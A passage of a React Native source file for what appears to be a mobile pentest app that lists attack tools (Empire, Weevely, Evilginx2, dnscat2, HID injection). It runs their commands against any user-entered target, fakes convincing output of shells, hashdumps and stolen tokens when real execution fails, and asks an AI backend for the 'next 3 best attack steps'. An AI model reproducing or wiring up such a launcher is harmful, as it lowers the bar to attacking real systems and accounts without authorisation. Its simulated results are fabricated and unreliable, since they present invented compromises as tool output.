    simulate: t => `Empire 5.9.3\n\n[+] Listener: http://${t}:8080\n[+] Stager generated → powershell.exe -ep bypass -enc base64...\n\n[+] Agent 1 connected!\n    Host: WIN-TARGET | User: CORP\\admin | PS Version: 5.1\n\n(Empire: agent1) > whoami\nNT AUTHORITY\\SYSTEM\n(Empire: agent1) > hashdump\nAdministrator::CORP:aad3b4:31d6cfe0d16ae931b73c59d7e0c089c0:::` },
  { id:"bloodhound", cat:"POST EXPLOIT",name:"BloodHound",       hint:"DC IP",        cmd:"bloodhound-python -u admin -p Password123! -d corp.local -ns {T} --zip",
    desc:"Active Directory attack path visualizer",
    simulate: t => `BloodHound 4.3.1\n[*] Collecting from ${t}...\n[*] Users: 247 | Groups: 89 | Computers: 134\n[*] Sessions: 43 | ACLs: 2891\n[*] GPOs: 12 | OUs: 8\n\n[!] Shortest path to DA:\n    user → IT Group → AdminSDHolder → Domain Admin\n    [3 hops]\n\n[*] Data saved: bloodhound_${new Date().toISOString().slice(0,10)}.zip` },
  { id:"weevely",    cat:"POST EXPLOIT",name:"Weevely",          hint:"URL",          cmd:"weevely generate password {T}/shell.php",
    desc:"PHP web shell generator & management console",
    simulate: t => `Weevely 4.0.1\n[*] Generating agent: ${t}/shell.php\n[+] Shell generated with key: s3cr3t\n\n[+] Connecting to ${t}/shell.php...\n[+] Connected! www-data@webserver:/var/www/html$\n\nweevely> id\nuid=33(www-data) gid=33(www-data)\nweevely> cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash` },
  { id:"dnscat2",    cat:"POST EXPLOIT",name:"DNSCat2",          hint:"your domain",  cmd:"dnscat2-server {T}",
    desc:"C2 channel over DNS — bypasses firewalls",
    simulate: t => `dnscat2 0.7.0-server\n[*] Listening for connections on ${t}\n\nNew session from client:\n    ID: ${r(1000,9999)}\n    Name: ${ip()} (Win-Target)\n\ndnscat2> window -i 1\ncommand (Win-Target) 1> shell\ncommand (Win-Target) 1> whoami\nNT AUTHORITY\\SYSTEM` },

  // ─── FORENSICS ────────────────────────────────────────────────────────────
  { id:"volatility", cat:"FORENSICS",   name:"Volatility3",     hint:"memory.dmp",   cmd:"vol -f {T} windows.pslist",
    desc:"Advanced memory forensics & malware detection",
    simulate: t => `Volatility 3.2.5\n[+] Plugin: windows.pslist\n\nPID    PPID  Name         Threads  Handles\n4      0     System       149      1682\n688    4     smss.exe     2        53\n752    688   csrss.exe    9        399\n4382   1456  malware.exe  3        87    ← SUSPICIOUS\n\n[!] malware.exe: no digital signature, network connections to ${ip()}` },
  { id:"binwalk",    cat:"FORENSICS",   name:"Binwalk",         hint:"firmware file", cmd:"binwalk -e {T}",
    desc:"Firmware analysis, extraction & hidden data",
    simulate: t => `DECIMAL       HEX         DESCRIPTION\n0             0x0         ELF 64-bit executable\n${r(1000,9999)}  0x${r(100,999).toString(16)} gzip compressed\n${r(10000,99999)} 0x${r(1000,9999).toString(16)} JFFS2 filesystem\n${r(100000,999999)} 0x${r(10000,99999).toString(16)} Squashfs\n\n[!] Extracted to _${t}.extracted/` },
  { id:"autopsy",    cat:"FORENSICS",   name:"Autopsy/Sleuth",  hint:"image.dd",     cmd:"mmls {T}",
    desc:"Digital forensics & disk image analysis",
    simulate: t => `Autopsy/Sleuth Kit 4.21\n[*] Image: ${t}\n[*] Partition Table: DOS\n\nSlot   Start        End        Length  Filesystem\n0      0            2047       2048    ---\n1      2048         1050623    1048576 FAT32\n2      1050624      500117503  499066880 NTFS\n\n[*] 247 files recovered | 12 deleted` },
  { id:"foremost",   cat:"FORENSICS",   name:"Foremost",        hint:"image.dd",     cmd:"foremost -t all -i {T} -o ./output",
    desc:"File carving — recover deleted files by header",
    simulate: t => `Foremost 1.5.7\n[*] Searching: ${t}\n\nProcessing: 100%\nRecovered:\n  jpg: ${r(10,50)}\n  png: ${r(5,20)}\n  pdf: ${r(2,10)}\n  doc: ${r(1,5)}\n  zip: ${r(0,3)}\n\n[*] ${r(20,80)} files carved to ./output/` },
  { id:"strings",    cat:"FORENSICS",   name:"Strings",         hint:"binary file",  cmd:"strings -a -n 8 {T} | grep -E '(password|key|secret|token|api)'",
    desc:"Extract readable strings from binaries",
    simulate: t => `strings — ${t} (interesting findings)\n\npassword=admin123\napi_key=sk-a1b2c3d4e5f6...\nsecret_token=eyJhbGciOiJSUzI1NiJ9\ndb_password=5ecureDBP@ss\nAWS_SECRET=AKIAIOSFODNN7EXAMPLE\nDATABASE_URL=postgresql://admin:pass@localhost/db\n\n[*] 6 sensitive strings found` },

  // ─── SOCIAL ENGINEERING ───────────────────────────────────────────────────
  { id:"gophish",    cat:"SOCIAL ENG",  name:"GoPhish",         hint:"LHOST IP",     cmd:"gophish",
    desc:"Professional phishing simulation framework",
    simulate: t => `GoPhish 0.12.1\n[*] Phishing server: http://${t}:3333\n[*] Campaign: IT Password Reset\n[*] Target list: 50 employees\n[*] Template: Microsoft O365 login page\n\n[+] Email sent to 50/50 targets\n[+] 23/50 opened email (46%)\n[+] 15/50 clicked link (30%)\n[+] 8/50 entered credentials (16%)\n\n[*] Credentials captured: 8` },
  { id:"evilginx",   cat:"SOCIAL ENG",  name:"Evilginx2",       hint:"domain.com",   cmd:"evilginx",
    desc:"MITM phishlet framework — bypass 2FA via session token theft",
    simulate: t => `Evilginx 3.2.0\n[*] Phishlet: o365 → ${t}\n[*] Lure URL: https://login.${t}/auth\n\n[+] Victim visited lure!\n    IP: ${ip()} | UA: Chrome/120\n[+] Captured: user@corp.com\n[+] Token: eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOi...\n\n[!] 2FA BYPASSED — session token stolen\n[+] Token replay gives full account access` },

  // ─── NETHUNTER ─────────────────────────────────────────────────────────────
  { id:"hidattack",  cat:"NETHUNTER",   name:"HID Attack",      hint:"payload name", cmd:"hid-keyboard-setup",
    desc:"NetHunter USB HID keyboard injection attack",
    simulate: t => `NetHunter HID Attack\n[*] USB HID Keyboard mode\n[+] Injecting: WIN+R → cmd /k powershell -ep bypass -e ...\n[*] ${r(1,3)}.${r(0,9)}s payload delivered\n[+] Reverse shell on port 4444` },
  { id:"badbluetooth",cat:"NETHUNTER",  name:"Bad Bluetooth",   hint:"victim MAC",   cmd:"hciconfig hci0 up",
    desc:"NetHunter Bluetooth HID keyboard injection",
    simulate: t => `NetHunter BadBluetooth\n[*] Target: ${t}\n[+] Paired as HID keyboard\n[*] Injecting keystrokes...\n[+] ${r(100,300)} keystrokes in ${r(1,5)}s\n[+] Payload delivered` },
  { id:"karma",      cat:"NETHUNTER",   name:"KARMA Attack",    hint:"target SSID",  cmd:"wifite --karma",
    desc:"Rogue AP + KARMA — intercept any WiFi client",
    simulate: t => `KARMA Attack\n[*] Rogue AP: "${t}"\n[*] Responding to all probe requests\n[+] Client connected: ${mac()}\n[+] NTLMv2 captured from CORP\\john\n[*] 3 clients | 2 credentials` },

  // ─── OSINT ──────────────────────────────────────────────────────────────
  { id:"maltego",    cat:"OSINT",       name:"Maltego",         hint:"domain/email", cmd:"maltego",
    desc:"Visual OSINT link analysis and entity mapping",
    simulate: t => `Maltego CE v4.6\n[*] Target: ${t}\n\n${t}\n├── Email: admin@${t}\n│   └── HaveIBeenPwned: 2 breaches\n├── IP: ${ip()}\n│   └── ASN: AS24940 Hetzner\n├── LinkedIn: linkedin.com/in/...\n└── GitHub: github.com/...\n    └── 47 repos, 3 with API keys!\n\n[*] 28 entities discovered` },
  { id:"osrframework",cat:"OSINT",      name:"OSRFramework",    hint:"username",     cmd:"usufy -n {T} -p twitter,instagram,github,reddit,linkedin",
    desc:"Username OSINT across 200+ social networks",
    simulate: t => `OSRFramework — username: ${t}\n\n[+] twitter.com/${t} → EXISTS\n[+] instagram.com/${t} → EXISTS\n[+] github.com/${t} → EXISTS (47 repos)\n[+] reddit.com/u/${t} → EXISTS\n[+] linkedin.com/in/${t} → EXISTS\n[-] facebook.com/${t} → NOT FOUND\n\n[*] 5/6 profiles found` },
  { id:"sherlock",   cat:"OSINT",       name:"Sherlock",        hint:"username",     cmd:"sherlock {T}",
    desc:"Find username across 300+ social networks",
    simulate: t => `Sherlock 0.14.3\n[*] Checking: ${t}\n\n[+] Twitter: https://twitter.com/${t}\n[+] Instagram: https://instagram.com/${t}\n[+] GitHub: https://github.com/${t}\n[+] Reddit: https://reddit.com/u/${t}\n[+] LinkedIn: https://linkedin.com/in/${t}\n[+] TikTok: https://tiktok.com/@${t}\n[+] Pinterest: https://pinterest.com/${t}\n\n[*] 7/293 sites found` },
  { id:"h8mail",     cat:"OSINT",       name:"H8mail",          hint:"email@dom.com",cmd:"h8mail -t {T}",
    desc:"Email OSINT — breach database lookup",
    simulate: t => `h8mail 2.5.2\n[*] Target: ${t}\n[+] HaveIBeenPwned: 3 breaches\n    LinkedIn 2021 (email, password_hash)\n    Collection #1 2019 (email, password)\n    Adobe 2013 (email, password_hint)\n[+] Leaked password: P@ssw0rd123\n[+] Leaked password: 123456789\n\n[!] Try: hydra -l ${t} -P leaks.txt ssh://TARGET` },
];

const CATEGORIES = ["ALL", ...Array.from(new Set(TOOLS.map(t => t.cat)))];

const CAT_COLOR: Record<string, string> = {
  "INFO GATHER":"#cc6600","VULN SCAN":"#ccaa00","EXPLOIT":"#cc0000",
  "PASSWORD":"#cc0044","WIRELESS":"#0088cc","WEB APP":"#00cc44",
  "SNIFF/SPOOF":"#8800cc","POST EXPLOIT":"#cc0088","FORENSICS":"#886600",
  "SOCIAL ENG":"#cc4400","NETHUNTER":"#ff0044","OSINT":"#0044cc","ALL":"#cc0000"
};

export default function ToolsScreen() {
  const insets = useSafeAreaInsets();
  const { addTerminalLine, setActiveScreen, execCommand, execMode, isAiLoading, setIsAiLoading, backendUrl } = useApp();
  const [cat, setCat] = useState("ALL");
  const [sel, setSel] = useState<Tool | null>(null);
  const [target, setTarget] = useState("");
  const [output, setOutput] = useState<string | null>(null);
  const [running, setRunning] = useState(false);
  const [installing, setInstalling] = useState(false);
  const [installMsg, setInstallMsg] = useState<string | null>(null);
  const [search, setSearch] = useState("");

  const filtered = TOOLS.filter(t =>
    (cat === "ALL" || t.cat === cat) &&
    (search === "" || t.name.toLowerCase().includes(search.toLowerCase()) || t.desc.toLowerCase().includes(search.toLowerCase()))
  );

  const runReal = async (tool: Tool, tgt: string) => {
    const cmd = tool.cmd.replace(/\{T\}/g, tgt);
    addTerminalLine({ type: "info", content: `[exec:${execMode}] ${cmd}` });
    const res = await execCommand(cmd);
    const lines = ((res.stdout || "") + (res.stderr || "")).split("\n").filter(Boolean);
    if (lines.length === 0 || (res.exitCode !== 0 && !res.stdout)) {
      return null; // no real output → fall back to simulate
    }
    return lines;
  };

  const runTool = async () => {
    if (!sel || !target.trim() || running) return;
    Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Heavy);
    setRunning(true);
    setOutput(null);
    setInstallMsg(null);

    // Try real execution first
    const realLines = await runReal(sel, target.trim());
    if (realLines && realLines.length > 0) {
      const out = realLines.join("\n");
      setOutput(out);
      realLines.forEach(l => addTerminalLine({ type: "output", content: l }));
      addTerminalLine({ type: "success", content: `[+] ${sel.name} done (real execution)` });
    } else {
      // Simulate
      await new Promise(r => setTimeout(r, 600 + Math.random() * 1200));
      const sim = sel.simulate(target.trim());
      setOutput(sim);
      addTerminalLine({ type: "success", content: `[+] ${sel.name} simulated against ${target.trim()}` });
    }
    setRunning(false);
  };

  const installTool = async (tool: Tool) => {
    if (installing) return;
    setInstalling(true);
    setInstallMsg("Checking if tool is available...");
    const checkRes = await execCommand(`which ${tool.id} 2>/dev/null || command -v ${tool.id} 2>/dev/null`);
    if (checkRes.stdout.trim()) {
      setInstallMsg(`✓ ${tool.name} is already installed at ${checkRes.stdout.trim()}`);
      setInstalling(false);
      return;
    }
    setInstallMsg(`Installing ${tool.name}...`);
    const installCmd = `apt-get install -y ${tool.id} 2>&1 || pip3 install ${tool.id} 2>&1 || echo "Not in apt/pip — manual install may be needed"`;
    const res = await execCommand(installCmd);
    const out = (res.stdout + res.stderr).slice(0, 200);
    setInstallMsg(res.exitCode === 0 ? `✓ Installed! ${out.slice(0,100)}` : `[!] ${out.slice(0,150)}\nTry Termux: pkg install ${tool.id}`);
    setInstalling(false);
  };

  const aiAnalyze = async (tool: Tool, tgt: string) => {
    if (isAiLoading || !tgt) return;
    setIsAiLoading(true);
    addTerminalLine({ type: "info", content: `[AI] Analyzing ${tool.name} output for ${tgt}...` });
    try {
      const resp = await fetch(`${backendUrl}/api/ai/chat`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          messages: [{ role: "user", content: `As a penetration tester, I ran ${tool.name} against ${tgt}. Output:\n${output || sel?.simulate(tgt) || ""}\n\nAnalyze this output. What are the critical findings? What are the next 3 best attack steps? Be specific and technical.` }],
        }),
      });
      const data = await resp.json();
      const reply = data?.content ?? "No response";
      addTerminalLine({ type: "info", content: `[AI] ${reply.slice(0, 500)}` });
      setActiveScreen("terminal");
    } catch (e: any) {
      addTerminalLine({ type: "error", content: `[!] AI error: ${e?.message}` });
    } finally {
      setIsAiLoading(false);
    }
  };

  const cc = CAT_COLOR[cat] || "#cc0000";

  return (
    <View style={styles.container}>
      {/* Search */}
      <View style={styles.searchRow}>
        <Feather name="search" size={14} color="#440000" />
        <TextInput
          style={styles.searchInput}
          value={search}
          onChangeText={setSearch}
          placeholder="Search 80+ tools..."
          placeholderTextColor="#330000"
          autoCapitalize="none"
          autoCorrect={false}
        />
        {search ? <TouchableOpacity onPress={() => setSearch("")}><Feather name="x" size={14} color="#440000" /></TouchableOpacity> : null}
      </View>

      {/* Category bar */}
      <ScrollView horizontal showsHorizontalScrollIndicator={false}
        style={styles.catRow}
        contentContainerStyle={{ gap: 5, paddingHorizontal: 8, paddingVertical: 7 }}>
        {CATEGORIES.map(c => (
          <TouchableOpacity key={c} onPress={() => setCat(c)}
            style={[styles.catBtn, { borderColor: cat === c ? (CAT_COLOR[c]||"#cc0000") : "#220000", backgroundColor: cat === c ? "#0a0000" : "transparent" }]}>
            <Text style={[styles.catText, { color: cat === c ? (CAT_COLOR[c]||"#cc0000") : "#440000" }]}>{c}</Text>
          </TouchableOpacity>
        ))}
      </ScrollView>

      {/* Tool list + detail */}
      <View style={styles.body}>
        <ScrollView style={styles.toolList} contentContainerStyle={{ paddingBottom: 16 }} showsVerticalScrollIndicator={false}>
          {filtered.map(tool => (
            <TouchableOpacity key={tool.id} style={[styles.toolRow, sel?.id === tool.id && { backgroundColor: "#0a0000", borderColor: CAT_COLOR[tool.cat]||"#cc0000" }]}
              onPress={() => { setSel(tool); setOutput(null); setInstallMsg(null); Haptics.selectionAsync(); }}>
              <View style={{ flex: 1 }}>
                <Text style={[styles.toolName, { color: sel?.id === tool.id ? (CAT_COLOR[tool.cat]||"#cc0000") : "#cc3300" }]}>{tool.name}</Text>
                <Text style={styles.toolCat}>{tool.cat}</Text>
              </View>
              <Feather name="chevron-right" size={12} color="#330000" />
            </TouchableOpacity>
          ))}
          <Text style={styles.toolCount}>{filtered.length} tools</Text>
        </ScrollView>

        {/* Detail panel */}
        <View style={styles.detail}>
          {!sel ? (
            <View style={styles.noSel}>
              <Text style={styles.noSelTitle}>⚡ {filtered.length} TOOLS</Text>
              <Text style={styles.noSelSub}>Select a tool{"\n"}Real execution via backend{"\n"}or Termux bridge</Text>
            </View>
          ) : (
            <ScrollView contentContainerStyle={{ paddingBottom: insets.bottom + 110 }} showsVerticalScrollIndicator={false}>
              <View style={[styles.toolHeader, { borderColor: CAT_COLOR[sel.cat]||"#cc0000" }]}>
                <Text style={[styles.toolDetailName, { color: CAT_COLOR[sel.cat]||"#cc0000" }]}>{sel.name}</Text>
                <Text style={styles.toolDetailCat}>{sel.cat}</Text>
                <Text style={styles.toolDetailDesc}>{sel.desc}</Text>
              </View>

              <View style={styles.cmdBox}>
                <Text style={styles.cmdLabel}>COMMAND</Text>
                <Text style={styles.cmdText} selectable>{sel.cmd.replace(/\{T\}/g, target || `[${sel.hint}]`)}</Text>
              </View>

              <TextInput
                style={styles.targetInput}
                value={target}
                onChangeText={setTarget}
                placeholder={sel.hint}
                placeholderTextColor="#440000"
                autoCapitalize="none"
                autoCorrect={false}
              />

              <View style={styles.btnRow}>
                <TouchableOpacity
                  style={[styles.runBtn, { borderColor: cc, backgroundColor: "#0a0000", flex: 2 }, (running || !target) && { opacity: 0.4 }]}
                  onPress={runTool}
                  disabled={running || !target.trim()}
                >
                  <Feather name="play" size={12} color={cc} />
                  <Text style={[styles.runBtnText, { color: cc }]}>{running ? "RUNNING..." : "EXECUTE"}</Text>
                </TouchableOpacity>
                <TouchableOpacity
                  style={[styles.iconAction, { borderColor: "#550055" }]}
                  onPress={() => aiAnalyze(sel, target)}
                  disabled={isAiLoading || !target.trim()}
                >
                  <Text style={{ fontSize: 14 }}>🤖</Text>
                </TouchableOpacity>
                <TouchableOpacity
                  style={[styles.iconAction, { borderColor: "#005500" }]}
                  onPress={() => installTool(sel)}
                  disabled={installing}
                >
                  <Feather name="download" size={14} color="#44ff44" />
                </TouchableOpacity>
              </View>

              {installMsg && (
                <View style={[styles.installBox, { borderColor: installMsg.startsWith("✓") ? "#44ff44" : "#cc0000" }]}>
                  <Text style={[styles.installText, { color: installMsg.startsWith("✓") ? "#44ff44" : "#ff6666" }]}>{installMsg}</Text>
                </View>
              )}

              {output && (
                <>
                  <View style={styles.outputHeader}>
                    <Text style={styles.outputLabel}>OUTPUT</Text>
                    <TouchableOpacity onPress={() => { output.split("\n").forEach(l => addTerminalLine({ type: "output", content: l })); setActiveScreen("terminal"); }}>
                      <Text style={styles.sendText}>→ TERMINAL</Text>
                    </TouchableOpacity>
                  </View>
                  <Text style={styles.outputText} selectable>{output}</Text>
                </>
              )}
            </ScrollView>
          )}
        </View>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1 },
  searchRow: { flexDirection: "row", alignItems: "center", gap: 8, paddingHorizontal: 10, paddingVertical: 7, borderBottomWidth: 1, borderBottomColor: "#1a0000" },
  searchInput: { flex: 1, fontFamily: "monospace", fontSize: 12, color: "#cc3300" },
  catRow: { borderBottomWidth: 1, borderBottomColor: "#1a0000", flexGrow: 0 },
  catBtn: { borderWidth: 1, paddingHorizontal: 8, paddingVertical: 4 },
  catText: { fontFamily: "monospace", fontSize: 9, fontWeight: "bold" },
  body: { flex: 1, flexDirection: "row" },
  toolList: { width: 130, borderRightWidth: 1, borderRightColor: "#1a0000" },
  toolRow: { padding: 9, borderBottomWidth: 1, borderBottomColor: "#0a0000", borderWidth: 1, borderColor: "transparent", flexDirection: "row", alignItems: "center" },
  toolName: { fontFamily: "monospace", fontSize: 10, fontWeight: "bold" },
  toolCat: { fontFamily: "monospace", fontSize: 7, color: "#440000", marginTop: 2 },
  toolCount: { fontFamily: "monospace", fontSize: 8, color: "#330000", textAlign: "center", paddingVertical: 6 },
  detail: { flex: 1, padding: 10 },
  noSel: { flex: 1, alignItems: "center", justifyContent: "center" },
  noSelTitle: { fontFamily: "monospace", fontSize: 16, fontWeight: "bold", color: "#cc0000" },
  noSelSub: { fontFamily: "monospace", fontSize: 10, color: "#440000", textAlign: "center", marginTop: 8, lineHeight: 18 },
  toolHeader: { borderWidth: 1, padding: 10, marginBottom: 8 },
  toolDetailName: { fontFamily: "monospace", fontSize: 14, fontWeight: "bold" },
  toolDetailCat: { fontFamily: "monospace", fontSize: 9, color: "#660000", marginTop: 2 },
  toolDetailDesc: { fontFamily: "monospace", fontSize: 10, color: "#880000", marginTop: 5, lineHeight: 16 },
  cmdBox: { backgroundColor: "#000", borderWidth: 1, borderColor: "#1a0000", padding: 8, marginBottom: 8 },
  cmdLabel: { fontFamily: "monospace", fontSize: 8, color: "#440000", marginBottom: 4 },
  cmdText: { fontFamily: "monospace", fontSize: 10, color: "#44ff44", lineHeight: 16 },
  targetInput: { borderWidth: 1, borderColor: "#330000", padding: 8, fontFamily: "monospace", fontSize: 12, color: "#ff3333", marginBottom: 8 },
  btnRow: { flexDirection: "row", gap: 6, marginBottom: 8 },
  runBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 6, borderWidth: 1, paddingVertical: 9 },
  runBtnText: { fontFamily: "monospace", fontSize: 11, fontWeight: "bold" },
  iconAction: { width: 38, height: 38, borderWidth: 1, alignItems: "center", justifyContent: "center" },
  installBox: { borderWidth: 1, padding: 8, marginBottom: 8 },
  installText: { fontFamily: "monospace", fontSize: 10, lineHeight: 16 },
  outputHeader: { flexDirection: "row", justifyContent: "space-between", alignItems: "center", marginBottom: 4 },
  outputLabel: { fontFamily: "monospace", fontSize: 9, color: "#660000", letterSpacing: 1 },
  sendText: { fontFamily: "monospace", fontSize: 9, color: "#cc0000" },
  outputText: { fontFamily: "monospace", fontSize: 9, color: "#cc6600", lineHeight: 15, backgroundColor: "#000", padding: 8, borderWidth: 1, borderColor: "#1a0000" },
});
